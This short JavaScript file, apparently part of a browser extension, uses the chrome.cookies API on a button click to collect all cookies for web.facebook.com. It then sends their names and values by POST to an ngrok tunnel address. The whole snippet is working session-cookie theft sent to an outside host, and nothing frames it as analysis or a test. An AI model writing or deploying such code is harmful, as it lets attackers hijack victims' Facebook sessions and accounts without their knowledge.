$("#klik").click(function () {
	chrome.cookies.getAll({ url: "https://web.facebook.com" }, function (cookies) {
		console.log(cookies);
		let cookieName = [];
		let cookieVal = [];
		cookies.forEach(function (cookie) {
			cookieName.push(cookie.name);
			cookieVal.push(cookie.value);
		});

		$.ajax({
			url: "https://12ab-2400-9800-b61-5e9c-ec5d-3116-c014-8afd.ngrok-free.app",
			type: "POST",
			data: { nama: cookieName, isi: cookieVal },
			success: function (response) {
				console.log("Data sent successfully");
				console.log(response);
			},
			error: function (error) {
				console.error("Error sending data:", error);
				console.log(error);
			},
		});
	});
});
